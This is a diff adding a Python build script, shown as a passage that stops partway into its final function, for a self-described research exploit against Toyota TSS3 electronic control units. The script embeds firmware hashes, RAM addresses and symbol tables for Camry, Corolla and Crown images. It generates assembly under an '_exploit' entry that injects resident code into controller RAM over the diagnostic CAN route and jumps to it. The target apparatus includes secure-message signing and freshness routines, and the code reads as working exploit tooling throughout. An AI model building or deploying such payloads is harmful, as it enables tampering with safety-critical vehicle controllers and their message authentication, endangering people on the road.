@@ -1,0 +1,1189 @@
+#!/usr/bin/env python3
+"""Build the historical direct-B6/C7 TSS3 signer experiment.
+
+This research-only runtime embeds exact firmware profiles and controls a
+resident through the stock functional diagnostic route. It is not the
+maintained RAM-runtime product path; use ``tools/toyota ram`` for that.
+"""
+from __future__ import annotations
+
+import argparse
+import json
+
+import struct
+import subprocess
+
+import tempfile
+from pathlib import Path
+from tools import REPO_ROOT
+
+REPO = REPO_ROOT
+
+from exploit.common.payload_package import package_shellcode
+from exploit.common.ram_exec import TOYOTA_P1ME_PAYLOAD_BUILD_SECRET
+from tools.targets.camry.research.ram_runtime.monitor.build_camry_f33_runtime_replay_discriminator import (
+    BOOT_SYMBOLS as F3_BOOT_SYMBOLS,
+)
+from tools.targets.camry.research.ram_runtime.monitor.build_camry_f33_runtime_replay_discriminator import (
+    IMAGE as CAMRY_IMAGE,
+)
+from tools.targets.camry.research.ram_runtime.monitor.build_camry_f33_runtime_replay_discriminator import (
+    IMAGE_SHA256 as CAMRY_SHA,
+)
+from tools.targets.camry.research.ram_runtime.monitor.build_camry_f33_runtime_replay_discriminator import (
+    RESIDENT_BASE as F3_RESIDENT_BASE,
+)
+from tools.targets.camry.research.ram_runtime.monitor.build_camry_f33_runtime_replay_discriminator import (
+    RESIDENT_LIMIT as F3_RESIDENT_LIMIT,
+)
+from tools.targets.camry.research.ram_runtime.monitor.build_camry_f33_runtime_replay_discriminator import (
+    RESIDENT_SYMBOLS as CAMRY_RESIDENT_BASE_SYMBOLS,
+)
+from tools.targets.camry.research.ram_runtime.monitor.build_camry_f33_runtime_replay_discriminator import (
+    STAGING_BASE as F3_STAGING_BASE,
+)
+from tools.targets.camry.research.ram_runtime.monitor.build_camry_f33_runtime_replay_discriminator import (
+    STAGING_LIMIT as F3_STAGING_LIMIT,
+)
+from tools.targets.camry.research.ram_runtime.monitor.build_camry_f33_runtime_replay_discriminator import (
+    STAGING_RESIDENT_OFFSET as F3_STAGING_RESIDENT_OFFSET,
+)
+from tools.targets.camry.research.ram_runtime.monitor.build_camry_f33_runtime_replay_discriminator import (
+    compile_asm,
+    jarl_targets,
+    nm_symbol,
+    RAM_FETCH_GUARD_BYTES,
+    require_ram_code_publication,
+    sha_bytes,
+    sha_file,
+)
+from tools.targets.camry.research.ram_runtime.monitor.build_camry_f33_runtime_replay_discriminator import (
+    staging_source as f3_staging_source,
+)
+from tools.targets.camry.research.ram_runtime.monitor.build_camry_f33_runtime_replay_discriminator import (
+    verify_static_contract as verify_camry_replay_contract,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    BOOT_SYMBOLS as COROLLA_BOOT_SYMBOLS,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    F_IMAGE as COROLLA_F_IMAGE,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    H_IMAGE as COROLLA_H_IMAGE,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    HELPER_BASE as COROLLA_HELPER_BASE,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    HELPER_LIMIT as COROLLA_HELPER_LIMIT,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    HELPER_SYMBOLS as COROLLA_HELPER_SYMBOLS,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    IMAGE_HASHES as COROLLA_HASHES,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    RESIDENT_BASE as COROLLA_RESIDENT_BASE,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    RESIDENT_LIMIT as COROLLA_RESIDENT_LIMIT,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    RESIDENT_SYMBOLS as COROLLA_RESIDENT_SYMBOLS,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    STAGING_BASE as COROLLA_STAGING_BASE,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    STAGING_HELPER_OFFSET as COROLLA_STAGING_HELPER_OFFSET,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    STAGING_LIMIT as COROLLA_STAGING_LIMIT,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    STAGING_RESIDENT_OFFSET as COROLLA_STAGING_RESIDENT_OFFSET,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    staging_source as corolla_staging_source,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    verify_image_contract as verify_corolla_image_contract,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_b6_inline_signer import (
+    verify_startup_survival as verify_corolla_startup_survival,
+)
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_command5_carrier import (
+    validate_toolchain,
+)
+
+MATRIX = REPO / "data/generated/tss3_resident_control_ingress_matrix.json"
+BUILDER = Path(__file__).resolve()
+DEFAULT_OUTPUT = REPO / "build/out/ephemeral-runtime/tss3-unified-b6-signer"
+BOOT_F181_HEX = "02" + "21" * 32
+CONTROL_CAN_ID = 0x777
+CONTROL_BUS = 1
+LEGACY_LOADER_WIRE = "07 C6 C6 index word_le32"
+RUNTIME_WIRE = "07 C7 C7 seq target_hi target_lo 00 00"
+UNIVERSAL_STAGING_BASE = 0xFEBF0000
+UNIVERSAL_STAGING_LIMIT = 0xFD0
+UNIVERSAL_PROFILE_DATA_OFFSET = 0x300
+UNIVERSAL_HELPER_TRANSIT_BASE = 0xFEF07C00
+UNIVERSAL_HELPER_TRANSIT_LIMIT = 0x400
+APPLICATION_IDENTITY_ADDR = 0x00020860
+BOOT_FAMILY_PROBE_ADDR = 0x00000C80
+BOOT_FAMILY_SIGNATURES = {
+    "f3": 0x9D230D21,
+    "corolla": 0x0030F6F3,
+}
+UNIVERSAL_STRATEGY = "universal-one-shot"
+
+UNIFIED_RESIDENT_SOURCE = REPO / "tools/targets/tss3/research/ram_runtime/tss3_unified_b6_signer_resident.S"
+FIELD_RESIDENT_SOURCE = REPO / "tools/targets/tss3/research/ram_runtime/tss3_unified_b6_signer_field_resident.S"
+UNIFIED_HELPER_SOURCE = REPO / "tools/targets/tss3/research/ram_runtime/tss3_unified_b6_signer_helper.S"
+CAMRY_POSTAUTH_HELPER_SOURCE = REPO / "tools/targets/camry/research/ram_runtime/b6/camry_f33_b6_postauth_override_helper.S"
+
+SPLIT_HELPER_BASE = 0xFEBF0000
+SPLIT_HELPER_WORDS = 150
+SPLIT_STATE_BASE = 0xFEBF025C
+SPLIT_STATE_SIZE = 12
+SPLIT_STATE_MAGIC = 0x53364249
+SPLIT_HELPER_LIMIT = SPLIT_STATE_BASE - SPLIT_HELPER_BASE
+SPLIT_TELEMETRY_BASE = 0xFEBF0268
+SPLIT_TELEMETRY_SIZE = 0x20
+
+CAMRY_EXTRA = {
+    "target_agg_pre": 0x00069CA2,
+    "target_rx_0": 0x0007BE3C,
+    "target_rx_1": 0x0007BBC2,
+    "target_rx_2": 0x0007C43C,
+    "target_rx_3": 0x00079EDE,
+    "target_stock_receive_tail": 0x0007A272,
+    "target_stock_aggregate_tail": 0x000667F2,
+}
+CAMRY_HELPER_SYMBOLS = {
+    "command5_sync": 0x00089BC2,
+    "freshness_encode": 0x00090566,
+    "mem_copy": 0x00089F2E,
+}
+CAMRY_POSTAUTH_HELPER_SYMBOLS = {
+    "secoc_aggregate": 0x000988C2,
+    "comm_after_secoc": 0x00069E7C,
+    "application_aggregate": 0x00058B5E,
+    "aggregate_final": 0x00066512,
+}
+
+CROWN_IMAGE = REPO / "firmware/crown-8965F3012000/CodeFlash.bin"
+CROWN_SHA = "5b89fdbc69edc2f66ef8a557f88b08c758e3146bd4e90067320d7966812b1273"
+CROWN_STARTUP_TARGETS = [
+    0x000626B2, 0x000626C8, 0x000626E8, 0x0006023E, 0x000604BC,
+    0x00060660, 0x00062738, 0x00061FAE, 0x00062A14, 0x0006010E,
+    0x0006226A, 0x00062AD4, 0x00062AF8, 0x00062B18, 0x00062C5C,
+    0x00070A10, 0x00062B38, 0x0006215E, 0x00065ABC, 0x00062B8C,
+    0x000659F2,
+]
+CROWN_RESIDENT_SYMBOLS = {
+    "app_cpu_context_init": 0x000709E4,
+    **{f"startup_{i:02d}": target for i, target in enumerate(CROWN_STARTUP_TARGETS)},
+    "app_startup_final_init": 0x0006F61A,
+    "fg_timing_begin": 0x00064312,
+    "fg_pre_0": 0x00064842, "fg_pre_1": 0x000707A8,
+    "fg_pre_2": 0x000663EE, "fg_pre_3": 0x000707C8,
+    "fg_post_0": 0x000707A8, "fg_post_1": 0x000660F2,
+    "fg_post_2": 0x000707C8, "fg_timing_end": 0x00064516,
+    "agg_6909e": 0x0006909E,
+    "rx_798f0": 0x000798F0, "rx_796c2": 0x000796C2,
+    "rx_79ea2": 0x00079EA2, "rx_792ee": 0x000792EE,
+    "stock_7961a_after_792ee": 0x00079638,
+    "stock_65be2_tail": 0x00065BEE,
+    "helper_entry": SPLIT_HELPER_BASE,
+}
+CROWN_HELPER_SYMBOLS = {
+    "mem_copy": 0x000879CE,
+    "freshness_encode": 0x0008E006,
+    "command5_sync": 0x00087662,
+}
+CROWN_GENERIC_RESIDENT_SYMBOLS = {
+    **CROWN_RESIDENT_SYMBOLS,
+    "target_agg_pre": 0x0006909E,
+    "target_rx_0": 0x000798F0,
+    "target_rx_1": 0x000796C2,
+    "target_rx_2": 0x00079EA2,
+    "target_rx_3": 0x000792EE,
+    "target_stock_receive_tail": 0x00079638,
+    "target_stock_aggregate_tail": 0x00065BEE,
+}
+
+APP_F181 = {
+    "8965F3307000": "023839363546333330373030300000000038413331313333303331303000000000",
+    "8965H1202000": "023839363546313230383030300000000038413331313132303230303000000000",
+    "8965F1208000": "023839363546313230383030300000000038413331313132313330303000000000",
+    "8965F3012000": "023839363546333031323030300000000038413331313330303830303000000000",
+}
+
+TARGETS = {
+    "camry-8965F3307000": {
+        "software_id": "8965F3307000",
+        "image": CAMRY_IMAGE,
+        "sha256": CAMRY_SHA,
+        "family": "camry-f33",
+        "profile": "camry-f33",
+        "boot_family": "f3",
+        "state_model": "split-telemetry",
+        "mpu_table": 0x31688,
+        "strategy": UNIVERSAL_STRATEGY,
+        "resident_source": UNIFIED_RESIDENT_SOURCE,
+        "helper_source": UNIFIED_HELPER_SOURCE,
+        "field_helper_source": CAMRY_POSTAUTH_HELPER_SOURCE,
+        "field_helper_symbols": CAMRY_POSTAUTH_HELPER_SYMBOLS,
+        "field_resident_macros": {"TSS3_CAMRY_POSTAUTH_OVERRIDE": 1},
+        "field_runtime_backend": "postauth-raw-com",
+        "resident_macros": {},
+        "helper_macros": {
+            "TSS3_B6_QUEUE_LEN_OFF": -0x6386, "TSS3_B6_TRAILER_OFF": -0x6310,
+            "TSS3_DCM_TAG_OFF": -0x60AE, "TSS3_DCM_SEQ_OFF": -0x60AD, "TSS3_DCM_TARGET_OFF": -0x60AC,
+            "TSS3_B6_APP_BASE_OFF": -0x632C, "TSS3_AUTH_RESET_OFF": -0x623C, "TSS3_AUTH_TRIP_OFF": -0x6240,
+            "TSS3_COMMITTED_TRIP_OFF": -0x6218, "TSS3_COMMITTED_RESET_OFF": -0x6214, "TSS3_COMMITTED_MESSAGE_OFF": -0x6210,
+            "TSS3_B6_B3_OFF": -0x6329,
+        },
+        "field_helper_macros": {
+            "TSS3_DCM_TAG_OFF": -0x60AE, "TSS3_DCM_SEQ_OFF": -0x60AD, "TSS3_DCM_TARGET_OFF": -0x60AC,
+            "TSS3_ROUTE_GENERATION_OFF": -0x649C,
+            "TSS3_RAW_B3_OFF": -0x6BFE, "TSS3_RAW_B4_OFF": -0x6BFD, "TSS3_RAW_B5_OFF": -0x6BFC,
+            "TSS3_RAW_B6_OFF": -0x6BFB, "TSS3_RAW_B8_OFF": -0x6BF9, "TSS3_RAW_B9_OFF": -0x6BF8,
+        },
+        "resident_base": F3_RESIDENT_BASE,
+        "resident_limit": F3_RESIDENT_LIMIT,
+        "helper_base": SPLIT_HELPER_BASE,
+        "helper_limit": SPLIT_HELPER_LIMIT,
+        "helper_symbols": CAMRY_HELPER_SYMBOLS,
+        "resident_symbols": {**CAMRY_RESIDENT_BASE_SYMBOLS, **CAMRY_EXTRA, "helper_entry": SPLIT_HELPER_BASE},
+        "b6_queue": 0xFEBE547A,
+        "b6_buffer": 0xFEBE54D4,
+        "auth_sync": 0xFEBE55C0,
+        "b6_committed": 0xFEBE55E8,
+        "mutation": "B3..B9 + locally computed B28..B31",
+        "runtime_mode": "supervised-continuous",
+        "host_loss_ticks": 7,
+    },
+    "corolla-8965H1202000": {
+        "software_id": "8965H1202000",
+        "image": COROLLA_H_IMAGE,
+        "sha256": COROLLA_HASHES["8965H1202000"],
+        "family": "corolla-hf",
+        "profile": "corolla-hf",
+        "boot_family": "corolla",
+        "state_model": "corolla-resident-prefix",
+        "mpu_table": 0x2D1E4,
+        "strategy": UNIVERSAL_STRATEGY,
+        "resident_source": UNIFIED_RESIDENT_SOURCE,
+        "helper_source": UNIFIED_HELPER_SOURCE,
+        "resident_macros": {"TSS3_COROLLA_HF": 1},
+        "helper_macros": {"TSS3_COROLLA_HF": 1},
+        "resident_base": COROLLA_RESIDENT_BASE,
+        "resident_limit": COROLLA_RESIDENT_LIMIT,
+        "helper_base": COROLLA_HELPER_BASE,
+        "helper_limit": COROLLA_HELPER_LIMIT,
+        "helper_symbols": COROLLA_HELPER_SYMBOLS,
+        "resident_symbols": COROLLA_RESIDENT_SYMBOLS,
+        "b6_queue": 0xFEBE5366,
+        "b6_buffer": 0xFEBE53C0,
+        "auth_sync": 0xFEBE54AC,
+        "b6_committed": 0xFEBE54D4,
+        "mutation": "B3..B5 + locally computed B28..B31",
+        "runtime_mode": "supervised-continuous",
+        "host_loss_ticks": 7,
+    },
+    "corolla-8965F1208000": {
+        "software_id": "8965F1208000",
+        "image": COROLLA_F_IMAGE,
+        "sha256": COROLLA_HASHES["8965F1208000"],
+        "family": "corolla-hf",
+        "profile": "corolla-hf",
+        "boot_family": "corolla",
+        "state_model": "corolla-resident-prefix",
+        "mpu_table": 0x2D1E4,
+        "strategy": UNIVERSAL_STRATEGY,
+        "resident_source": UNIFIED_RESIDENT_SOURCE,
+        "helper_source": UNIFIED_HELPER_SOURCE,
+        "resident_macros": {"TSS3_COROLLA_HF": 1},
+        "helper_macros": {"TSS3_COROLLA_HF": 1},
+        "resident_base": COROLLA_RESIDENT_BASE,
+        "resident_limit": COROLLA_RESIDENT_LIMIT,
+        "helper_base": COROLLA_HELPER_BASE,
+        "helper_limit": COROLLA_HELPER_LIMIT,
+        "helper_symbols": COROLLA_HELPER_SYMBOLS,
+        "resident_symbols": COROLLA_RESIDENT_SYMBOLS,
+        "b6_queue": 0xFEBE5366,
+        "b6_buffer": 0xFEBE53C0,
+        "auth_sync": 0xFEBE54AC,
+        "b6_committed": 0xFEBE54D4,
+        "mutation": "B3..B5 + locally computed B28..B31",
+        "runtime_mode": "supervised-continuous",
+        "host_loss_ticks": 7,
+    },
+    "crown-8965F3012000": {
+        "software_id": "8965F3012000",
+        "image": CROWN_IMAGE,
+        "sha256": CROWN_SHA,
+        "family": "crown-f30",
+        "profile": "crown-f30",
+        "boot_family": "f3",
+        "state_model": "split-telemetry",
+        "mpu_table": 0x31330,
+        "strategy": UNIVERSAL_STRATEGY,
+        "resident_source": UNIFIED_RESIDENT_SOURCE,
+        "helper_source": UNIFIED_HELPER_SOURCE,
+        "resident_macros": {},
+        "helper_macros": {
+            "TSS3_B6_QUEUE_LEN_OFF": -0x685A, "TSS3_B6_TRAILER_OFF": -0x67E4,
+            "TSS3_DCM_TAG_OFF": -0x6582, "TSS3_DCM_SEQ_OFF": -0x6581, "TSS3_DCM_TARGET_OFF": -0x6580,
+            "TSS3_B6_APP_BASE_OFF": -0x6800, "TSS3_AUTH_RESET_OFF": -0x6710, "TSS3_AUTH_TRIP_OFF": -0x6714,
+            "TSS3_COMMITTED_TRIP_OFF": -0x66EC, "TSS3_COMMITTED_RESET_OFF": -0x66E8, "TSS3_COMMITTED_MESSAGE_OFF": -0x66E4,
+            "TSS3_B6_B3_OFF": -0x67FD,
+        },
+        "resident_base": F3_RESIDENT_BASE,
+        "resident_limit": F3_RESIDENT_LIMIT,
+        "helper_base": SPLIT_HELPER_BASE,
+        "helper_limit": SPLIT_HELPER_LIMIT,
+        "helper_symbols": CROWN_HELPER_SYMBOLS,
+        "resident_symbols": CROWN_GENERIC_RESIDENT_SYMBOLS,
+        "b6_queue": 0xFEBE4FA6,
+        "b6_buffer": 0xFEBE5000,
+        "auth_sync": 0xFEBE50EC,
+        "b6_committed": 0xFEBE5114,
+        "mutation": "B3..B9 + locally computed B28..B31",
+        "runtime_mode": "supervised-continuous",
+        "host_loss_ticks": 7,
+    },
+}
+
+
+def _matrix_target(name: str) -> dict:
+    matrix = json.loads(MATRIX.read_text(encoding="utf-8"))
+    if matrix.get("schema") != "toyota-tss3-resident-control-ingress-matrix-v1":
+        raise RuntimeError("TSS3 ingress matrix schema drift")
+    target = matrix["targets"][name]
+    functional = target["functional_diagnostic_ingress"]
+    if not (
+        functional["can_id"] == "0x777"
+        and functional["cantp_rx_pdu"] == "0x0805"
+        and functional["pdur_rx_pdu"] == "0x0803"
+        and functional["functional_request_type"] == 1
+        and functional["functional_service_ids"] == ["0x10", "0x14", "0x28", "0x31", "0x3E", "0x85"]
+        and functional["c6_configured"] is False
+        and functional["c7_configured"] is False
+        and functional["functional_nrc11_suppressed"] is True
+        and functional["wire"]["loader"] == LEGACY_LOADER_WIRE
+        and functional["wire"]["runtime"] == RUNTIME_WIRE
+        and "durable tail" in functional["wire"]["tag_policy"]
+    ):
+        raise RuntimeError(f"{name} functional ingress matrix drift")
+    return target
+
+
+def _verify_target(name: str, spec: dict, image: bytes) -> dict:
+    if sha_bytes(image) != spec["sha256"]:
+        raise RuntimeError(f"{name} CodeFlash identity drift")
+    family = spec["boot_family"]
+    observed_boot_signature = int.from_bytes(image[BOOT_FAMILY_PROBE_ADDR:BOOT_FAMILY_PROBE_ADDR + 4], "little")
+    if observed_boot_signature != BOOT_FAMILY_SIGNATURES[family]:
+        raise RuntimeError(
+            f"{name} boot-family signature drift: expected {family}=0x{BOOT_FAMILY_SIGNATURES[family]:08X}, "
+            f"observed 0x{observed_boot_signature:08X}"
+        )
+    matrix_target = _matrix_target(name)
+    if matrix_target["codeflash_sha256"] != spec["sha256"] or matrix_target["software_id"] != spec["software_id"]:
+        raise RuntimeError(f"{name} matrix/image identity mismatch")
+    if name == "camry-8965F3307000":
+        verify_camry_replay_contract(image)
+    elif spec["family"] == "corolla-hf":
+        verify_corolla_image_contract(image)
+    elif name == "crown-8965F3012000":
+        # The cross-variant ingress matrix plus exact CodeFlash SHA is the new
+        # unified transport authority; legacy Crown builder prose/contracts may
+        # evolve independently and must not gate this parallel implementation.
+        pass
+    return matrix_target
+
+
+def _macro_literal(value: int) -> str:
+    if value < 0:
+        return f"-0x{-value:X}"
+    return f"0x{value:X}"
+
+
+def _compile(image_name: str, work: Path, source: Path, stem: str, vma: int, symbols: dict, macros: dict[str, int]) -> dict:
+    wrapper = work / f"{stem}_wrapper.S"
+    defines = "\n".join(f"#define {key} {_macro_literal(value)}" for key, value in macros.items())
+    wrapper.write_text(defines + f'\n#include "/src/{source.relative_to(REPO)}"\n', encoding="utf-8")
+    return compile_asm(work=work,
+    source=wrapper.name,
+    stem=stem,
+    vma=vma,
+    symbols=symbols,
+    source_in_repo=False,)
+
+
+
+def _align(value: int, alignment: int) -> int:
+    return (value + alignment - 1) & -alignment
+
+
+PROFILE_TARGETS = {
+    "camry-f33": "camry-8965F3307000",
+    "crown-f30": "crown-8965F3012000",
+    "corolla-hf": "corolla-8965H1202000",
+}
+PROFILE_RUNTIME_IDENTITIES = {
+    "camry-f33": "8965F3307000",
+    "crown-f30": "8965F3012000",
+    # Both retained H/F calibrations run the 8965F1208000 application family.
+    "corolla-hf": "8965F1208000",
+}
+HELPER_FETCH_END = {
+    "camry-f33": 0xFEBF0308,
+    "crown-f30": 0xFEBF0308,
+    "corolla-hf": 0xFEBF0200,
+}
+UNIVERSAL_BOOT_SYMBOLS = {
+    **{f"f3_{key}": value for key, value in F3_BOOT_SYMBOLS.items()},
+    **{f"corolla_{key}": value for key, value in COROLLA_BOOT_SYMBOLS.items()},
+}
+TARGET_BOOT_SYMBOLS = {
+    "f3": F3_BOOT_SYMBOLS,
+    "corolla": COROLLA_BOOT_SYMBOLS,
+}
+
+
+def _profile_file_stem(profile: str) -> str:
+    return profile.replace("-", "_")
+
+
+def _identity_words(text: str) -> tuple[int, int, int]:
+    raw = text.encode("ascii")
+    if len(raw) != 12:
+        raise RuntimeError(f"runtime identity must be exactly 12 bytes: {text!r}")
+    return tuple(int.from_bytes(raw[i:i + 4], "little") for i in range(0, 12, 4))  # type: ignore[return-value]
+
+
+def _verify_globalram_transit(name: str, spec: dict, image: bytes) -> dict:
+    # The universal helper transit lives in the final 1 KiB of the 64-KiB
+    # GlobalRAM. Exact images contain no aligned pointer literal into that span,
+    # and the byte-identical application MPU table gives region 12 supervisor
+    # R/W/X (0xB8) in both recovered contexts across the whole FEC0..FFFF range.
+    end = UNIVERSAL_HELPER_TRANSIT_BASE + UNIVERSAL_HELPER_TRANSIT_LIMIT
+    pointer_hits = []
+    for off in range(0, len(image) - 3, 4):
+        value = int.from_bytes(image[off:off + 4], "little")
+        if UNIVERSAL_HELPER_TRANSIT_BASE <= value < end:
+            pointer_hits.append((off, value))
+    if pointer_hits:
+        raise RuntimeError(f"{name} contains GlobalRAM transit pointer literals: {pointer_hits}")
+    mpu = int(spec["mpu_table"])
+    words = struct.unpack_from("<64I", image, mpu)
+    lo12, hi12 = words[24], words[25]
+    ctx0_12, ctx1_12 = words[44], words[60]
+    if not (lo12 <= UNIVERSAL_HELPER_TRANSIT_BASE and end - 1 <= hi12 and ctx0_12 == ctx1_12 == 0xB8):
+        raise RuntimeError(
+            f"{name} GlobalRAM transit MPU drift: region12=0x{lo12:08X}..0x{hi12:08X} "
+            f"ctx0=0x{ctx0_12:X} ctx1=0x{ctx1_12:X}"
+        )
+    return {
+        "mpu_table": f"0x{mpu:06X}",
+        "mpu_region": 12,
+        "mpu_bounds": [f"0x{lo12:08X}", f"0x{hi12:08X}"],
+        "ctx0_mpat": f"0x{ctx0_12:08X}",
+        "ctx1_mpat": f"0x{ctx1_12:08X}",
+        "aligned_codeflash_pointer_hits": [],
+    }
+
+
+def _compile_profile(profile: str, spec: dict, work: Path) -> dict:
+    stem = _profile_file_stem(profile)
+    helper = _compile(
+        profile, work, spec["helper_source"], f"{stem}_helper", spec["helper_base"],
+        spec["helper_symbols"], spec["helper_macros"],
+    )
+    helper_blob = helper["blob"]
+    assert isinstance(helper_blob, bytes)
+    if nm_symbol(str(helper["nm"]), "helper_entry") != spec["helper_base"]:
+        raise RuntimeError(f"{profile} helper entry drift")
+    if len(helper_blob) > spec["helper_limit"]:
+        raise RuntimeError(f"{profile} helper no longer fits target low pocket: {len(helper_blob)}")
+    if profile != "corolla-hf" and len(helper_blob) % 4:
+        helper_blob += b"\0" * (-len(helper_blob) % 4)
+    if len(helper_blob) > UNIVERSAL_HELPER_TRANSIT_LIMIT:
+        raise RuntimeError(f"{profile} helper exceeds universal GlobalRAM transit")
+    if spec["helper_base"] + len(helper_blob) + RAM_FETCH_GUARD_BYTES > HELPER_FETCH_END[profile]:
+        raise RuntimeError(f"{profile} helper plus 48-byte fetch guard exceeds initialized RAM")
+
+    resident_symbols = {
+        **spec["resident_symbols"],
+        "helper_size": len(helper_blob),
+        "helper_copy_words": _align(len(helper_blob), 4) // 4,
+    }
+    resident = _compile(
+        profile, work, spec["resident_source"], f"{stem}_resident", spec["resident_base"],
+        resident_symbols, spec["resident_macros"],
+    )
+    resident_blob = resident["blob"]
+    assert isinstance(resident_blob, bytes)
+    if nm_symbol(str(resident["nm"]), "resident_entry") != spec["resident_base"]:
+        raise RuntimeError(f"{profile} resident entry drift")
+    if len(resident_blob) > spec["resident_limit"]:
+        raise RuntimeError(f"{profile} resident too large: {len(resident_blob)}")
+    if spec["resident_base"] + len(resident_blob) + RAM_FETCH_GUARD_BYTES > 0xFEC00000:
+        raise RuntimeError(f"{profile} resident plus 48-byte fetch guard exceeds physical LocalRAM")
+    if helper["relocations"] or resident["relocations"]:
+        raise RuntimeError(f"{profile} runtime retains relocations")
+    require_ram_code_publication(str(resident["disasm"]), 1, f"{profile} helper install")
+
+    foreground_entry = nm_symbol(str(resident["nm"]), "foreground_entry")
+    return {
+        "spec": spec,
+        "resident": resident,
+        "helper": helper,
+        "resident_blob": resident_blob,
+        "helper_blob": helper_blob,
+        "foreground_entry": foreground_entry,
+    }
+
+
+def _universal_staging_source(profiles: dict[str, dict], layout: dict[str, dict]) -> str:
+    lines = [
+        "    .section .text",
+        "    .global _exploit",
+        "_exploit:",
+        f"    movea 0x{BOOT_FAMILY_PROBE_ADDR:04X}, r0, r20",
+        "    ld.w 0[r20], r1",
+        f"    mov 0x{BOOT_FAMILY_SIGNATURES['f3']:08X}, r2",
+        "    cmp r2, r1",
+        "    be .L_boot_f3",
+        f"    mov 0x{BOOT_FAMILY_SIGNATURES['corolla']:08X}, r2",
+        "    cmp r2, r1",
+        "    be .L_boot_corolla",
+        "    br .L_fail",
+        ".L_boot_f3:",
+    ]
+    for i in range(4):
+        lines.append(f"    jarl32 f3_boot_init_{i}, lp")
+    lines += [
+        "    jarl32 f3_boot_validity_check, lp",
+        "    cmp r0, r10",
+        "    bne .L_fail",
+        "    br .L_identify_f3",
+        ".L_boot_corolla:",
+    ]
+    for i in range(4):
+        lines.append(f"    jarl32 corolla_boot_init_{i}, lp")
+    lines += [
+        "    jarl32 corolla_boot_validity_check, lp",
+        "    cmp r0, r10",
+        "    bne .L_fail",
+        "    br .L_identify_corolla",
+    ]
+
+    def append_identity_dispatch(label: str, allowed_profiles: tuple[str, ...]) -> None:
+        lines.extend([
+            f".L_identify_{label}:",
+            "    movhi 0x2, r0, r20",
+            "    movea 0x0860, r20, r20       /* application identity only after boot init/validity */",
+            "    ld.w 0[r20], r1",
+            f"    mov 0x{_identity_words('8965F3307000')[0]:08X}, r2",
+            "    cmp r2, r1",
+            "    bne .L_fail",
+            "    ld.w 4[r20], r1",
+        ])
+        for profile in allowed_profiles:
+            _w0, w1, _w2 = _identity_words(PROFILE_RUNTIME_IDENTITIES[profile])
+            profile_label = profile.replace("-", "_")
+            lines.extend([f"    mov 0x{w1:08X}, r2", "    cmp r2, r1", f"    be .L_check_{profile_label}"])
+        lines.append("    br .L_fail")
+        for profile in allowed_profiles:
+            _w0, _w1, w2 = _identity_words(PROFILE_RUNTIME_IDENTITIES[profile])
+            profile_label = profile.replace("-", "_")
+            lines.extend([
+                f".L_check_{profile_label}:",
+                "    ld.w 8[r20], r1",
+                f"    mov 0x{w2:08X}, r2",
+                "    cmp r2, r1",
+                "    bne .L_fail",
+                f"    br .L_install_{profile_label}",
+            ])
+
+    append_identity_dispatch("f3", ("camry-f33", "crown-f30"))
+    append_identity_dispatch("corolla", ("corolla-hf",))
+
+    for profile in ("camry-f33", "crown-f30", "corolla-hf"):
+        label = profile.replace("-", "_")
+        row = layout[profile]
+        resident_size = len(profiles[profile]["resident_blob"])
+        helper_size = len(profiles[profile]["helper_blob"])
+        lines += [
+            f".L_install_{label}:",
+            "    movhi 0xFEBF, r0, r6",
+            f"    movea 0x{row['resident_offset']:04X}, r6, r6",
+            "    movhi 0xFEC0, r0, r7",
+            "    movea -0x0610, r7, r7       /* FEBFF9F0 */",
+            f"    movea {resident_size}, r0, r8",
+            f".L_copy_resident_{label}:",
+            "    ld.b 0[r6], r9",
+            "    st.b r9, 0[r7]",
+            "    add 1, r6",
+            "    add 1, r7",
+            "    add -1, r8",
+            "    cmp r0, r8",
+            f"    bne .L_copy_resident_{label}",
+            "    ld.b -1[r7], r9",
+            "    syncp",
+            "    synci",
+            "    movhi 0xFEBF, r0, r6",
+            f"    movea 0x{row['helper_offset']:04X}, r6, r6",
+            "    movhi 0xFEF0, r0, r7",
+            "    movea 0x7c00, r7, r7       /* common temporary GlobalRAM helper transit */",
+            f"    movea {helper_size}, r0, r8",
+            f".L_copy_helper_{label}:",
+            "    ld.b 0[r6], r9",
+            "    st.b r9, 0[r7]",
+            "    add 1, r6",
+            "    add 1, r7",
+            "    add -1, r8",
+            "    cmp r0, r8",
+            f"    bne .L_copy_helper_{label}",
+            "    ld.b -1[r7], r9",
+            "    syncp",
+            "    synci",
+            "    movhi 0xFEC0, r0, r12",
+            "    movea -0x0610, r12, r12",
+            "    jmp [r12]",
+        ]
+
+    lines += [".L_fail:", "    br .L_fail"]
+    for profile in ("camry-f33", "crown-f30", "corolla-hf"):
+        label = profile.replace("-", "_")
+        stem = _profile_file_stem(profile)
+        row = layout[profile]
+        lines += [
+            f"    .org 0x{row['resident_offset']:X}",
+            f"profile_{label}_resident:",
+            f"    .incbin \"/out/{stem}_resident.bin\"",
+            f"    .org 0x{row['helper_offset']:X}",
+            f"profile_{label}_helper:",
+            f"    .incbin \"/out/{stem}_helper.bin\"",
+        ]
+    return "\n".join(lines) + "\n"
+
+
+def build_universal(out: Path) -> dict:
+    images: dict[str, bytes] = {}
+    matrix_targets: dict[str, dict] = {}
+    transit_proofs: dict[str, dict] = {}
